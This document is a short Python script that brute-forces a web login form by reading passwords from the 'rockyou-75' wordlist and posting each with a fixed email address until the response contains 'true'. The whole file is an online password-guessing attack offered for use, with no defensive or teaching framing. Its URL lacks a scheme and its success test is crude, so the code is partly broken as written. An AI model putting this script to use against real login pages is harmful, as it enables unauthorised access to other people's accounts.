import requests

url = "examplewebsite.com/login/php" #url that login requests are sent to


def send_request(username, password,
                 bool):  # parameters can be changed depending on what is needed for authentication
    data = {
        "email": username,
        "password": password,
        "remember": bool
    }
    r = requests.post(url, data=data)
    if "true" in r.text:
        return True
    else:
        return False


no_pw_found = True;
with open('rockyou-75.txt') as f: ##rockyou-75 is a text file containing a few hundred commonly used passwords
    for lines in f:
        password = lines.replace("\n", "")
        print("trying " + password)
        if send_request("example_email@domain.com", password, False): #wisimon
            print("The password is " + password)
            no_pw_found = False;
            break
    if no_pw_found:
        print("password not found")
